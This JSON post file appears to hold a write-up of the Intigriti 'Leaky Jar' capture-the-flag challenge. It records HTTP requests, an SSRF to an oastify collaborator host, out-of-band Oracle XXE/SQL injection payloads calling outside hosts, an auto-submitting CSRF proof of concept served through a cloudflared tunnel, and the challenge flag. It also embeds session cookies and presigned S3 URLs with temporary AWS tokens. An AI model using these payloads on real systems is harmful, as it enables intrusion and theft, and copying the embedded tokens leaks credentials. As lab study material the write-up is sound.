@@ -1,0 +1,205 @@
+{
+  "id": "38a3405d-7b65-8078-b6ed-e8f438f9532b",
+  "title": "Leaky Jar Intigriti June Challenge",
+  "slug": "leaky-jar-intigriti-june-challenge",
+  "type": "CTF",
+  "platform": "Intigriti",
+  "difficulty": "easy",
+  "tags": [
+    "CSRF",
+    "ssrf"
+  ],
+  "published": true,
+  "featured": true,
+  "date": "2026-06-25",
+  "cover": "https://leakyjar.intigriti.io/static/images/logo.svg",
+  "summary": "using csrf to gain unauthorized data",
+  "blocks": [
+    {
+      "type": "heading_2",
+      "content": "Robots.txt"
+    },
+    {
+      "type": "paragraph",
+      "content": "User-agent: *\nDisallow: /admin\nDisallow: /admin/login\nDisallow: /backup\nDisallow: /api/v1/\nDisallow: /internal/\nDisallow: /.git/\n\n"
+    },
+    {
+      "type": "heading_2",
+      "content": "Reflected param"
+    },
+    {
+      "type": "heading_3",
+      "content": "q parameter "
+    },
+    {
+      "type": "code",
+      "content": "https://leakyjar.intigriti.io/recipes?q=abcd\n\n   <form class=\"search\" method=\"GET\" action=\"/recipes\">\n        <input type=\"text\" name=\"q\" value=\"pgum9o7pje\" placeholder=\"Search recipes...\">\n        <button class=\"btn\" type=\"submit\">Search</button>\n    </form>\n\n    \n    <p style=\"color:var(--muted);margin:0 0 24px;\">Showing results for \"pgum9o7pje\" — <a href=\"/recipes\">clear search</a></p>",
+      "language": "html"
+    },
+    {
+      "type": "heading_3",
+      "content": "name and text parameter"
+    },
+    {
+      "type": "code",
+      "content": "POST /recipes/5ff1ad72-7600-41fc-adb8-8499db07a2b7/review HTTP/2\nHost: leakyjar.intigriti.io\nCookie: session=eyJ1c2VyIjoibG92ZTA3MGpfMDEifQ.ajzJZg.LRv1Bi-0DhY5Wa1f_k_ES7OmmI8\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 52\nOrigin: https://leakyjar.intigriti.io\nReferer: https://leakyjar.intigriti.io/recipes/5ff1ad72-7600-41fc-adb8-8499db07a2b7\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\n\nname=abcd%27%3E&stars=5&text=comment+from+abcd%27%3E\n\n--------------------\n\n           <div class=\"review\">\n                <div class=\"review-head\">\n                    <span class=\"review-name\">abcd&#39;&gt;</span>\n                    <span class=\"review-stars\">★★★★★</span>\n                </div>\n                <p class=\"review-text\">comment from abcd&#39;&gt;</p>\n            </div>\n            ",
+      "language": "html"
+    },
+    {
+      "type": "code",
+      "content": "POST /vault/add HTTP/2\nHost: leakyjar.intigriti.io\nCookie: session=eyJ1c2VyIjoibG92ZTA3MGpfMDEifQ.ajzE6A.0ZBLParGyshz_D_WBZBZ6i0go3I\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://leakyjar.intigriti.io/register\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nname=d58etl9c7b&password=\n\n\n<div class=\"kv\">\n                <span><strong>d58etl9c7b</strong></span>\n                <span style=\"color:var(--cocoa);\"></span>\n            </div>",
+      "language": "html"
+    },
+    {
+      "type": "paragraph",
+      "content": "\n\n"
+    },
+    {
+      "type": "heading_2",
+      "content": "Cross site request forgery"
+    },
+    {
+      "type": "paragraph",
+      "content": "csrf at /register /share ,/submit ,/recipe/pageid ,/vault/add "
+    },
+    {
+      "type": "paragraph",
+      "content": "\n"
+    },
+    {
+      "type": "heading_2",
+      "content": "SSRF"
+    },
+    {
+      "type": "paragraph",
+      "content": "it is vulnerable to ssrf /submit endpoint \n"
+    },
+    {
+      "type": "code",
+      "content": "POST /submit HTTP/2\nHost: leakyjar.intigriti.io\nCookie: session=eyJ1c2VyIjoibG92ZTA3MGpfMDEifQ.ajzJZg.LRv1Bi-0DhY5Wa1f_k_ES7OmmI8\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 62\nOrigin: https://leakyjar.intigriti.io\nReferer: https://leakyjar.intigriti.io/submit\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\n\nurl=https%3A%2F%2Ficy9t9v2ww1al0hfzc487rly8peg26qv.oastify.com\n\n----\nhttp from collaboratotr\n\n\nGET / HTTP/1.1\nHost: icy9t9v2ww1al0hfzc487rly8peg26qv.oastify.com\nConnection: keep-alive\nsec-ch-ua: \"Not(A:Brand\";v=\"99\", \"HeadlessChrome\";v=\"133\", \"Chromium\";v=\"133\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Linux\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/133.0.6943.16 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br, zstd",
+      "language": "html"
+    },
+    {
+      "type": "heading_2",
+      "content": "Clickjacking \n"
+    },
+    {
+      "type": "paragraph",
+      "content": "clickjacking possible at all endpoints\nhttps://clickjacker.io/test?url=https://leakyjar.intigriti.io/ "
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/b96d16d0-6d89-4924-903c-77d44805938f/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665EVLGXPK%2F20260728%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260728T121334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbWraBFpZjsh8rEHP0i6pysM5rN1ZOlyw3xXlb%2B%2BeRCAiBfDCWVTsqmliG%2Ffi2c82QJsRLOaqWsm7nERj%2BnxNFETir%2FAwhlEAAaDDYzNzQyMzE4MzgwNSIMfKi94cJpj0zmSv6PKtwDlDw%2BOcwBUby2UU%2BPvG9FRqg6rHG%2BofLs19s3zvr%2FCstqSQod4Z9kiSDPsfxuVODLU14sZNVXvZI6e29BVF6mQGU1n%2BryffYqzld2RMgqhXd6s1DGx%2B7caxdbzXNdI58cTA7HpONUHx%2FJz9Idv%2F1pfftPpw18BSDmMFHLihtEOwD8DHWikoiK3NgeyjOQjUZW4LcCAHuyc80VXP9n4R2faGyRX8jsVcw953S2Ycb1r%2Bn02sDaqxfkZdaU%2BJ7sK9xuj1UrTHmaPrV0uxQ3UMRxBA698Y4sPgGH0YkYCK%2FjS51nh1%2F2o0x7NDJzY64isWI9cfRDp2PMpdzsGfVT%2Br52SYbdxFEdvfG1gBX%2FBvPqJ1lvhLJy7pQME4XtmetXPXbi%2BPZk9zKVyRAhUnS37BZ0%2F%2Bb4IPRihuXoedpT4nFqUh27HZKWc07MWBiiWQtM6oU%2F%2Bv4g%2Ff%2FYdb3b4JpwDACK61DhnMyqRiKentPf51V%2FNaLku82nFHWlKZoIz0mZG8RuIq2Wr7IB26xEl2zaVbxNibiG1pRr%2BqcvMbOCj4XM%2FXs8KGAyQfXTWZJMWokr17pPEko9qF64R6gYW%2FJuV86nLCB0ibZQQwXwY%2BJI2h4Oj8SI9om8vncBufD6kbkw9LKi0wY6pgFBpxBXqxuKjn35rPJc7Io61h8ze01p5gZBnzLNTMuMni8e4HZRglTO1yC5AUS2iAwFZFmPDDTrfmxvtZ3FLDGYOPZI5zm0qvVhMhE3mRQRlw1GZOLyKR0e9GZvwvsJT2od%2FLHxnf5cc915EoEKbKO3G2%2BLnaorcIW8RRJ9%2FASFnbsvzc%2B7R5A0F6w%2BWbsUq8lxfOTinDz2M3LE3qwB1JmdLsdxwbXI&X-Amz-Signature=482985ab25b74090a421d61b66a6fa419b1ef6dba306781290d06896df360c75&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "heading_2",
+      "content": "Reflected Stored parameter \n"
+    },
+    {
+      "type": "heading_3",
+      "content": "text parameter"
+    },
+    {
+      "type": "code",
+      "content": "POST /recipes/032dc434-9c17-4240-b4cf-412babf6dd6e/review HTTP/2\nHost: leakyjar.intigriti.io\nCookie: session=eyJ1c2VyIjoibG92ZTA3MGpfMDEifQ.ajzE6A.0ZBLParGyshz_D_WBZBZ6i0go3I\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://leakyjar.intigriti.io/recipes\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 19\n\nname=&stars=5&text=(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20ldnyc%20SYSTEM%20%22http%3a%2f%2fm3q3dj98z21v0kktfksou0ebb2hv5m1a4ywlo9d.oasti'%7c%7c'fy.com%2f%22%3e%25ldnyc%3b]%3e')%2c'%2fl')%20from%20dual)\n\n\n\n------\n\n               <p class=\"review-text\">(select extractvalue(xmltype(&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % bsdko SYSTEM &#34;http://m3q3dj98z21v0kktfksou0ebb2hv5m1a4ywlo9d.oasti&#39;||&#39;fy.com/&#34;&gt;%bsdko;]&gt;&#39;),&#39;/l&#39;) from dual)</p>",
+      "language": "html"
+    },
+    {
+      "type": "heading_3",
+      "content": "name parameter"
+    },
+    {
+      "type": "code",
+      "content": "POST /vault/add HTTP/2\nHost: leakyjar.intigriti.io\nCookie: session=eyJ1c2VyIjoibG92ZTA3MGpfMDEifQ.ajzE6A.0ZBLParGyshz_D_WBZBZ6i0go3I\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 54\nOrigin: https://leakyjar.intigriti.io\nReferer: https://leakyjar.intigriti.io/vault\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\n\nname=(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20yeaiv%20SYSTEM%20%22http%3a%2f%2fep7vzbv0lunnmc6l1ceggs03xu3nrhh5ktcg24r.oasti'%7c%7c'fy.com%2f%22%3e%25yeaiv%3b]%3e')%2c'%2fl')%20from%20dual)&password=this+is+the+recipe+as+below\n\n\n----\n           \n            <div class=\"kv\">\n                <span><strong>(select extractvalue(xmltype(&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % ewnnn SYSTEM &#34;http://ep7vzbv0lunnmc6l1ceggs03xu3nrhh5ktcg24r.oasti&#39;||&#39;fy.com/&#34;&gt;%ewnnn;]&gt;&#39;),&#39;/l&#39;) from dual)</strong></span>\n                <span style=\"color:var(--cocoa);\">this is the recipe as below</span>\n            </div>",
+      "language": "html"
+    },
+    {
+      "type": "heading_1",
+      "content": "Notes"
+    },
+    {
+      "type": "bulleted_list_item",
+      "content": "q parameter seems to properly escaped "
+    },
+    {
+      "type": "bulleted_list_item",
+      "content": "name and password parameter seems properly escaped in /vault/add  "
+    },
+    {
+      "type": "heading_1",
+      "content": "Observation"
+    },
+    {
+      "type": "heading_2",
+      "content": "Test1"
+    },
+    {
+      "type": "paragraph",
+      "content": "first account add some recipe —>  share my recipe box with second account —> second account can now view first accounts all recipe "
+    },
+    {
+      "type": "heading_2",
+      "content": "Test2 "
+    },
+    {
+      "type": "paragraph",
+      "content": "create a csrf poc for share my recipe box—> share it with b1 , as he opens the poc , it will automatically share the recipe box with b2"
+    },
+    {
+      "type": "code",
+      "content": "<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n    <form action=\"https://leakyjar.intigriti.io/share\" method=\"POST\">\n      <input type=\"hidden\" name=\"username\" value=\"b2\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n",
+      "language": "html"
+    },
+    {
+      "type": "paragraph",
+      "content": " "
+    },
+    {
+      "type": "heading_1",
+      "content": "Attack flow "
+    },
+    {
+      "type": "paragraph",
+      "content": "Since the master baker is accessing  our server with ssrf in submit page. lets place our CSRF poc in our server and report the link to the  master baker"
+    },
+    {
+      "type": "paragraph",
+      "content": "so place a poc as submitpoc.html with the below content "
+    },
+    {
+      "type": "code",
+      "content": "<html>\n  <body>\n    <form action=\"https://leakyjar.intigriti.io/share\" method=\"POST\">\n      <input type=\"hidden\" name=\"username\" value=\"b2\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n",
+      "language": "html"
+    },
+    {
+      "type": "paragraph",
+      "content": "start a local host server in the same folder python -m http.server "
+    },
+    {
+      "type": "paragraph",
+      "content": "then using cloudflare proxy serve this to internet cloudflared tunnel --url http://localhost:8000 "
+    },
+    {
+      "type": "paragraph",
+      "content": "in the /submit page give the url  https://tickets-relax-gamecube-bikini.trycloudflare.com/submitpoc.html "
+    },
+    {
+      "type": "paragraph",
+      "content": "as soon as the master baker clicks it , we will get admin’s recipe box shared with us - which includes the flag "
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/c3370081-7e2d-4811-8fc0-b1a83aff80ec/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665EVLGXPK%2F20260728%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260728T121334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbWraBFpZjsh8rEHP0i6pysM5rN1ZOlyw3xXlb%2B%2BeRCAiBfDCWVTsqmliG%2Ffi2c82QJsRLOaqWsm7nERj%2BnxNFETir%2FAwhlEAAaDDYzNzQyMzE4MzgwNSIMfKi94cJpj0zmSv6PKtwDlDw%2BOcwBUby2UU%2BPvG9FRqg6rHG%2BofLs19s3zvr%2FCstqSQod4Z9kiSDPsfxuVODLU14sZNVXvZI6e29BVF6mQGU1n%2BryffYqzld2RMgqhXd6s1DGx%2B7caxdbzXNdI58cTA7HpONUHx%2FJz9Idv%2F1pfftPpw18BSDmMFHLihtEOwD8DHWikoiK3NgeyjOQjUZW4LcCAHuyc80VXP9n4R2faGyRX8jsVcw953S2Ycb1r%2Bn02sDaqxfkZdaU%2BJ7sK9xuj1UrTHmaPrV0uxQ3UMRxBA698Y4sPgGH0YkYCK%2FjS51nh1%2F2o0x7NDJzY64isWI9cfRDp2PMpdzsGfVT%2Br52SYbdxFEdvfG1gBX%2FBvPqJ1lvhLJy7pQME4XtmetXPXbi%2BPZk9zKVyRAhUnS37BZ0%2F%2Bb4IPRihuXoedpT4nFqUh27HZKWc07MWBiiWQtM6oU%2F%2Bv4g%2Ff%2FYdb3b4JpwDACK61DhnMyqRiKentPf51V%2FNaLku82nFHWlKZoIz0mZG8RuIq2Wr7IB26xEl2zaVbxNibiG1pRr%2BqcvMbOCj4XM%2FXs8KGAyQfXTWZJMWokr17pPEko9qF64R6gYW%2FJuV86nLCB0ibZQQwXwY%2BJI2h4Oj8SI9om8vncBufD6kbkw9LKi0wY6pgFBpxBXqxuKjn35rPJc7Io61h8ze01p5gZBnzLNTMuMni8e4HZRglTO1yC5AUS2iAwFZFmPDDTrfmxvtZ3FLDGYOPZI5zm0qvVhMhE3mRQRlw1GZOLyKR0e9GZvwvsJT2od%2FLHxnf5cc915EoEKbKO3G2%2BLnaorcIW8RRJ9%2FASFnbsvzc%2B7R5A0F6w%2BWbsUq8lxfOTinDz2M3LE3qwB1JmdLsdxwbXI&X-Amz-Signature=29629a2fea08d41a604d066ff102fda207f11ddb0ecfba7c40c9f39e8629093f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "heading_1",
+      "content": "Flag "
+    },
+    {
+      "type": "paragraph",
+      "content": "INTIGRITI{019ef404-1e44-7748-bdcf-ca7b12dbfee0}"
+    }
+  ]
+}
